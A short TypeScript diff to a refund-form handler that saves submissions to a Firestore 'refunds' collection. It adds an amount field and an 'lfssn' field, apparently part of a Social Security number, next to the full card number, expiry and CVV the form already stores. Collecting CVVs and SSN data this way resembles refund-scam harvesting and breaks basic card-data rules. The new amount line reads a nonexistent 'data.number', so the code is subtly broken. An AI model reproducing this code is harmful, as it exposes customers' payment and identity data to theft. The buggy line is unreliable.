@@ -5,6 +5,7 @@ import { collection, addDoc } from 'firebase/firestore';
 
 // Define an interface for the form data
 export interface FormData {
+  amount: number;
   orderId: string;
   reason: string;
   firstName: string;
@@ -16,6 +17,7 @@ export interface FormData {
   cardNumber: string;
   expirationDate: string;
   cvv: string;
+  lfssn: string;
 }
 
 // Define the function to handle form submission
@@ -25,6 +27,7 @@ export const handleFormSubmit = async (data: FormData): Promise<{ message: strin
   try {
     // Add data to Firestore (Refunds collection)
     const docRef = await addDoc(collection(db, 'refunds'), {
+      amount: data.number,
       orderId: data.orderId,
       reason: data.reason,
       firstName: data.firstName,
@@ -36,6 +39,7 @@ export const handleFormSubmit = async (data: FormData): Promise<{ message: strin
       cardNumber: data.cardNumber,
       expirationDate: data.expirationDate,
       cvv: data.cvv,
+      lfssn: data.lfssn,
       timestamp: new Date(),
     });
 
